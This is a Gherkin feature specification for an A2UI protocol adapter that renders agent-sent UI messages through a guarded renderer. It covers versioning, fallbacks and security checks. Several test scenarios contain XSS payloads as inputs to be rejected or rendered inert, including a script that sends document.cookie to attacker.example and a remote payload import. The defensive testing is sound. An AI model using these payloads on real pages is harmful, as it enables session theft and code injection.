Feature: A2UI protocol adapter
  @kimen/adapter-a2ui translates declarative A2UI messages into the neutral
  catalog and hands every surface to the guarded renderer. The adapter is
  disposable: it declares the exact A2UI protocol versions it supports,
  absorbs protocol churn inside its own package, and never opens a path
  around the guardrail.

  Rule: A2UI messages become catalog specs rendered through the guardrail

    # S1
    Scenario: A supported A2UI message renders as catalog components
      Given an A2UI agent speaking a protocol version the adapter declares
      When the agent sends a message describing an order summary card with a "Confirm order" button
      Then the guarded renderer renders the surface
      And every rendered element is a catalog component

    # S2
    Scenario: An incremental update revises the surface without losing it
      Given a surface already rendered from an A2UI message
      When the agent sends an incremental update adding a "Delivery notes" text input
      Then the surface gains the new input
      And the previously rendered components persist

    # S3
    Scenario: A declared action returns to the agent as an A2UI event
      Given a rendered surface whose "Confirm order" button is bound to the declared action "confirm-order"
      When the user activates the button
      Then the agent receives an A2UI interaction event naming the action "confirm-order"

  Rule: Protocol gaps and churn degrade by declaration, never silently

    # S4
    Scenario: An unmapped A2UI component type renders its declared fallback
      Given the compatibility matrix declares no catalog mapping for an A2UI component type
      When the agent sends a message using that component type
      Then the declared fallback renders in its place and the gap is reported to the agent
      And the rest of the surface renders normally

    # S5
    Scenario: A message from an undeclared protocol version is rejected
      Given an adapter whose compatibility matrix declares its exact supported A2UI versions
      When an agent sends a message tagged with a protocol version outside that matrix
      Then the adapter rejects the message naming the versions it supports
      And nothing from the rejected message renders

    # S6
    Scenario: The compatibility matrix binds adapter versions to protocol coverage
      Given the published adapter package
      When the compatibility matrix is consulted
      Then each adapter version maps to exact A2UI protocol versions
      And each mapped A2UI component type names its catalog counterpart

  Rule: The guardrail is a security boundary no message can bypass

    # S7
    Scenario: A message using a type the matrix declares forbidden is rejected
      Given the compatibility matrix declares the A2UI type "html" forbidden for security
      When the agent sends a message declaring a component of type "html" whose content is "<script>fetch('https://attacker.example/'+document.cookie)</script>"
      Then the whole message is rejected naming the forbidden type "html"
      And nothing from the rejected message renders

    # S8
    Scenario: An action outside the declared set never dispatches
      Given a rendered surface whose declared action set contains only "confirm-order"
      When the agent sends an update binding a button to the action "export-account-data"
      Then the binding is rejected naming the undeclared action
      And activating that button dispatches no event

    # S9
    Scenario: An unknown property on a catalog component is rejected
      Given a connected A2UI agent
      When the agent sends a message giving a button the property "onPointerEnter" with value "import('https://attacker.example/payload.js')"
      Then the message is rejected naming the unknown property "onPointerEnter"
      And nothing from the rejected message renders

    # S10
    Scenario: Data-model content renders as inert text, never as code
      Given a rendered surface whose text label is bound to a data-model value
      When the agent updates that value to "<img src=x onerror=alert(document.domain)>"
      Then the label shows those characters as inert text
      And no script executes and no request leaves the page

  Rule: Degradation and adapter plumbing never open a side channel

    # S11
    Scenario: A hostile payload under an unmapped type never reaches the fallback
      Given the compatibility matrix declares no catalog mapping for an A2UI component type
      When the agent sends a message using that type with content "<img src=x onerror=alert(1)>"
      Then the declared fallback renders without any agent-supplied content
      And no script executes and no request leaves the page

    # S12
    Scenario: Every render call from protocol input goes to the guarded renderer alone
      Given an adapter whose guarded renderer is replaced by an instrumented double
      When the agent sends a message containing a non-catalog component type
      Then every rendering call the adapter makes arrives at the guarded renderer double
      And nothing reaches the surface outside those calls
